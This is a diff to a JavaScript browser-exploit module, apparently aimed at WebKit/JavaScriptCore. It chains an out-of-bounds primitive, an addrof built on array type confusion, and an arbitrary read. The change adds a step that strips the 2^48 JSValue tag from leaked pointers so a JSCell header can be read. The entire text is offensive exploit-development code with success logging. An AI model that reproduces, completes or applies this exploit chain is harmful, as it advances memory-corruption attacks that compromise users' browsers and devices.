@@ -1,23 +1,21 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v95 - R60 Simplificado e Funcional)
+// js/script3/testArrayBufferVictimCrash.mjs (v96 - R60 com Unboxing de Ponteiro)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// O script foi simplificado para usar a combinação das primitivas que já se provaram
-// estáveis:
-// 1. A `addrof` obtida via Type Confusion no Array "Uncaged".
-// 2. A `arb_read` importada diretamente do `core_exploit.mjs`.
-// Isso remove a complexidade e a fonte de erro da criação de um `fakeobj`.
+// Implementada a etapa final de "unboxing" (ou "untagging") do ponteiro. O valor
+// vazado pela 'addrof' é um JSValue "encaixotado". Subtraímos o tag 2^48 para
+// obter o endereço de memória real antes de usá-lo com a leitura arbitrária.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    arb_read, // Usaremos esta primitiva, que já é funcional!
+    arb_read,
     getOOBDataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_FinalVerification_v95_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_PointerUnboxing_v96_R60";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -37,16 +35,16 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO SIMPLIFICADA)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação Funcional Direta ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação com Unboxing de Ponteiro ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional não obteve sucesso." };
 
     try {
-        // --- FASE 1: Obtendo primitiva OOB ---
+        // --- FASE 1: Obtenção de primitiva OOB ---
         logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
@@ -57,26 +55,31 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
         
-        // Assumimos que a corrupção OOB permite a Type Confusion
         const addrof = (obj) => {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
         logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' operacional! ++++++++++++`, "vuln");
 
-        // --- FASE 3: Verificação Funcional da Leitura Arbitrária ---
-        logS3("--- FASE 3: Verificando Leitura Arbitrária com as primitivas estáveis... ---", "subtest");
+        // --- FASE 3: Verificação Funcional com Unboxing ---
+        logS3("--- FASE 3: Verificando Leitura Arbitrária com Unboxing de Ponteiro... ---", "subtest");
         
         const test_obj = { verification: 0xCAFEBABE };
-        const test_obj_addr = addrof(test_obj);
-        logS3(`Endereço do objeto de teste (via addrof): ${test_obj_addr.toString(true)}`, "info");
+        const boxed_addr = addrof(test_obj);
+        logS3(`Endereço "Boxed" do objeto de teste: ${boxed_addr.toString(true)}`, "info");
         
-        // Agora usamos a `arb_read` importada e funcional para ler a memória.
-        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
-        const header_leaked = await arb_read(test_obj_addr, 8); // Usando a primitiva do core_exploit
+        // **NOVO**: Subtrai o tag 2^48 para obter o endereço de memória real.
+        const POINTER_TAG = new AdvancedInt64(0, 0x10000); // 2^48
+        const real_test_obj_addr = boxed_addr.sub(POINTER_TAG);
+        logS3(`Endereço Real (após unboxing): ${real_test_obj_addr.toString(true)}`, "leak");
+        
+        // Agora usamos a `arb_read` com o endereço real.
+        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${real_test_obj_addr.toString(true)}...`, "info");
+        const header_leaked = await arb_read(real_test_obj_addr, 8);
         logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");
 
-        if (header_leaked && !header_leaked.equals(0)) {
+        // Condição de sucesso corrigida para ser mais explícita.
+        if (header_leaked && !header_leaked.equals(AdvancedInt64.Zero)) {
             logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso total na leitura de memória.", "good");
             final_result = {
                 success: true,
